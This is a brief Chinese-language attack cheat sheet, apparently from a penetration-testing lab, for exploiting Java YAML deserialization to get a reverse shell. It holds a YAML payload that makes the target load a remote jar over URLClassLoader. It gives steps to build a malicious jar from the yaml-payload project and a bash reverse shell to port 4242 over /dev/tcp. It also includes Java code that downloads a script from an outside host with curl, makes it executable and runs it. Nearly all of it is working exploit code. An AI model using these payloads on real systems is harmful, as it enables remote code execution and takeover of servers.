# java-yaml反弹

```bash
1. 测试联通
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7/"]
  ]]
]
2. 下载并修改恶意jar
proxychains4 -f /etc/proxychains4.conf git clone https://github.com/artsploit/yaml-payload.git
修改AwesomeScriptEngineFactory.java 参数
先要检测ping：ping -c [ip]
而后才是命令执行：
3. 编译
javac --release 11 src/artsploit/AwesomeScriptEngineFactory.java 
jar -cvf ping.jar -C src/ .  //打包
4. 实现反弹端口（java）中一般选择sh调用。其他的容易出错
5. 写一个脚本（shell.sh）
==============================================
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.196/4242 0>&1
==============================================
6. 将java文件修改成如下
==============================================
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.14.29/shell.sh -o /tmp/shell.sh");
            Runtime.getRuntime().exec("chmod +x /tmp/shell.sh");
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
=================================================
```
